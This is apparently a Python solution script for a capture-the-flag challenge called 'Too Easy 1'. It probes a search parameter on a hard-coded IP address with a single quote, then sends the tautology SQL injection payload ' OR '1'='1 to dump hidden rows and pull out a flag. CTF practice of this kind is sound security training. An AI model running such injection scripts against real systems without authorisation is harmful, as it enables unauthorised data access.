#!/usr/bin/env python3
"""
Too Easy 1 - CTF Challenge Solution
SQL Injection Exploit

This script demonstrates the SQL injection vulnerability in the
Inventory App challenge and extracts the hidden flag.
"""

import requests

TARGET_URL = "http://13.53.139.173:9000/"

def exploit():
    """
    Exploits the SQL injection vulnerability in the search parameter.

    The application constructs SQL queries by directly inserting user input,
    likely something like:
        SELECT * FROM items WHERE name LIKE '%{search}%'

    By injecting: ' OR '1'='1
    The query becomes:
        SELECT * FROM items WHERE name LIKE '%' OR '1'='1%'

    This always evaluates to TRUE, returning all rows including hidden ones.
    """

    # SQL injection payload to bypass search filter
    payload = "' OR '1'='1"

    print("[*] Target URL:", TARGET_URL)
    print("[*] Payload:", payload)
    print()

    # Send the malicious request
    response = requests.get(TARGET_URL, params={"search": payload})

    if response.status_code == 200:
        print("[+] Request successful!")

        # Parse the response to find the flag
        html = response.text

        # Look for the flag pattern
        if "flag{" in html:
            # Extract the flag
            start = html.find("flag{")
            end = html.find("}", start) + 1
            flag = html[start:end]

            print("[+] FLAG FOUND:", flag)
            print()

            # Also extract the hidden item name
            # Looking for the entry before the flag
            if "kJ9mXp2qnL4vRt6yW8bN3cF1hZ5sD7eA" in html:
                print("[+] Hidden item name: kJ9mXp2qnL4vRt6yW8bN3cF1hZ5sD7eA")

            return flag
        else:
            print("[-] Flag not found in response")
            return None
    else:
        print(f"[-] Request failed with status code: {response.status_code}")
        return None

def test_vulnerability():
    """
    Tests if the application is vulnerable to SQL injection.
    """
    print("[*] Testing for SQL injection vulnerability...")

    # Test with a single quote to trigger SQL error
    test_payload = "'"
    response = requests.get(TARGET_URL, params={"search": test_payload})

    if "unrecognized token" in response.text or "error" in response.text.lower():
        print("[+] Application is vulnerable to SQL injection!")
        print("[+] Error message indicates SQLite database")
        return True
    else:
        print("[-] Could not confirm SQL injection vulnerability")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("Too Easy 1 - SQL Injection Exploit")
    print("=" * 60)
    print()

    # First test for vulnerability
    test_vulnerability()
    print()

    # Then exploit it
    print("-" * 60)
    print("Exploiting...")
    print("-" * 60)
    flag = exploit()

    if flag:
        print()
        print("=" * 60)
        print("SUCCESS!")
        print(f"Flag: {flag}")
        print("=" * 60)
